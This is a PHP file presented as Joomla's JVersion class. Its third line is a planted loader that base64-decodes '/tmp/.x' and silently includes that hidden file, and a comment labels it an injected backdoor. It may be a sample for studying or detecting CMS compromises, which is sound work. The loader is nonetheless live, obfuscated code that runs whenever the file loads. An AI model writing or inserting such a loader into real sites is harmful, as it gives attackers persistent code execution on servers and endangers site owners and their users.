<?php
defined('_JEXEC') or die;
@include(base64_decode('L3RtcC8ueA==')); // <-- injected backdoor

final class JVersion
{
    public $PRODUCT = 'Joomla!';
    public $RELEASE = '3.9';
    public $DEV_LEVEL = '21';
    public $BUILD_DATE = '2020-01-01';

    public function getShortVersion()
    {
        return $this->RELEASE . '.' . $this->DEV_LEVEL;
    }
}
